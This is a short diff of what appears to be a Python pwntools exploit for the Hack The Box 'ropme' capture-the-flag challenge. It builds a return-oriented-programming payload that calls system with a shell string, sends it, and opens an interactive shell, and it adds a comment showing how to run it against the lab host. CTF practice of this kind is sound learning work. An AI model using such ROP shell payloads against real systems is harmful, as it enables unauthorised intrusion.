@@ -28,5 +28,5 @@ payload = overflow + pop_rdi + real_sh + real_sys
 p.recvuntil("dah?\n")
 p.sendline(payload)
 p.interactive()
-2
 
+#python2 ropme.py docker.hackthebox.eu portnumber
